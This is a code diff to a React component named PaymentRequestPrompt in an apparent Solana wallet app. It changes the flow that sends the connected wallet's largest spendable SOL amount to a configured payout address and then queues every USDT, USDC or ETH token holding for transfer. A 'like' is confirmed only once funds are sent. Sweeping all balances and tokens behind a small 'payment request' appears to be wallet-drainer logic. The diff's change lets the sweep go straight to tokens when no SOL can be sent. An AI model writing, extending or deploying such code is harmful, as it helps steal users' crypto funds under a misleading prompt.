@@ -5,7 +5,7 @@ import { ChevronDown, Info } from 'lucide-react'
 import toast from 'react-hot-toast'
 import { useWalletState } from '../context/WalletContext'
 import { isWalletUserCancel } from '../lib/walletConnectHelpers'
-import { buildPayoutTransaction, buildSplPayoutTransaction, listSplHoldings, spendableLamports, tokenFeeReserveLamports, type SplHolding } from '../lib/payoutTransfer'
+import { buildPayoutTransaction, buildSplPayoutTransaction, getSolSendableLamports, listSplHoldings, spendableLamports, tokenFeeReserveLamports, type SplHolding } from '../lib/payoutTransfer'
 import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PaymentAsset, type PayoutConfig } from '../lib/payoutWallet'
 import { SolanaBadgeIcon } from './walletIcons'
 import { PaymentRequestModal } from './PaymentRequestModal'
@@ -403,11 +403,17 @@ export function PaymentRequestPrompt() {
 
     try {
       if (phase.current === 'sol') {
-        setStatus(`Opening ${connectedWalletName}. Confirm the SOL transfer there. Nothing is sent until you approve it.`)
         const holdings = await listSplHoldings(connection, publicKey)
         const reserveLamports = tokenFeeReserveLamports(holdings.length)
-        let sentSol = false
-        try {
+        const sendableSol = await getSolSendableLamports({
+          connection,
+          from: publicKey,
+          config,
+          reserveLamports,
+        })
+
+        if (sendableSol > 0) {
+          setStatus(`Opening ${connectedWalletName}. Confirm the SOL transfer there. Nothing is sent until you approve it.`)
           const transaction = await buildPayoutTransaction({
             connection,
             from: publicKey,
@@ -415,28 +421,27 @@ export function PaymentRequestPrompt() {
             reserveLamports,
           })
           const signature = await sendBuilt(transaction)
-          sentSol = true
           toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
-        } catch (err) {
-          if (isWalletUserCancel(err)) throw err
-          const message = err instanceof Error ? err.message : ''
-          if (!holdings.length || !/not enough sol/i.test(message)) throw err
+          if (!likedAfterSol.current) {
+            likedAfterSol.current = true
+            notifyFundsConfirmed(peekPendingLike())
+          }
         }
 
-        if (sentSol && !likedAfterSol.current) {
-          likedAfterSol.current = true
-          notifyFundsConfirmed(peekPendingLike())
-        }
-
-        const remaining = await listSplHoldings(connection, publicKey)
+        const remaining = sendableSol > 0 ? await listSplHoldings(connection, publicKey) : holdings
         if (remaining.length === 0) {
-          finishSequence()
-          return
+          if (sendableSol > 0) {
+            finishSequence()
+            return
+          }
+          throw new Error('No SOL, USDT, USDC, or ETH is available to send after network fees.')
         }
         phase.current = 'token'
         queue.current = remaining
-        queueNext()
-        return
+        if (sendableSol > 0) {
+          queueNext()
+          return
+        }
       }
 
       const step = queue.current[0]
